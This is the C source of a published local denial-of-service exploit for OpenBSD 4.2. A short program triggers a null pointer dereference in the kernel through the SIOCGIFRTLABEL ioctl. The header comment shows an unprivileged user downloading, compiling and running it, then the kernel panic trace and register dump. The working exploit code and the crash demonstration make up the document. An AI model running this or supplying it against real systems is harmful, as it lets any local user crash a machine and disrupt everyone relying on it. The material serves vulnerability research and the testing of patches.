/*
 * OpenBSD 4.2 rtlabel_id2name() [SIOCGIFRTLABEL ioctl]
 * Null Pointer Dereference local Denial of Service Exploit
 *
 * by Hunger <rtlabdos@hunger.hu>
 *
 * Advisory:
 * http://marc.info/?l=openbsd-security-announce&m=120007327504064
 *
 * FOR TESTING PURPOSES ONLY!
 *
 * $ uname -mrsv
 * OpenBSD 4.2 GENERIC#375 i386
 * $ id
 * uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
 * $ ftp -V http://hunger.hu/rtlabdos.c
 * 100% |******************************************|  1814        00:00
 * $ gcc rtlabdos.c -o rtlabdos
 * $ ./rtlabdos
 * uvm_fault(0xd617865e0, 0x0, 0, 1) -> e
 * kernel: page fault trap, code=0
 * Stopped at      strlcpy+0x1c:    movb     0(%edx),%al
 * ddb> trace
 * strlcpy(d826fd98,0,20,6,d61772a0) at strlcpy+0x1c
 * ifioctl(d6033280,c0206983,d826fe78,d616696c,d61772a0) at ifioctl+0xa0d
 * sys_ioctl(d616696c,d826ff68,d826ff58,1c000680,73) at sys_ioctl+0x125
 * syscall() at syscall+0x24a
 * --- syscall (number 54) ---
 * 0xf557d1:
 * ddb> show registers
 * ds                  0x10
 * es                  0x10
 * fs                  0x58
 * gs                  0x10
 * edi                    0
 * esi                 0x20
 * ebp           0xd826fd60        end+0x7a33a90
 * ebx           0xd826fd98        end+0x7a33ac8
 * edx                    0
 * ecx                 0x1f
 * eax                    0
 * eip           0xd064acb0        strlcpy+0x1c
 * cs                   0x8
 * eflags           0x10212
 * esp           0xd826fd54        end+0x7a33a84
 * ss            0xd8260010        end+0x7a23d40
 * strlcpy+0x1c:   movb    0(%edx),%al
 *
 */

#include <sys/param.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

int
main(void)
{
struct ifreq ifr = { .ifr_name = "lo0" };

return ioctl(socket(AF_INET, SOCK_DGRAM, 0), SIOCGIFRTLABEL, &ifr);
}

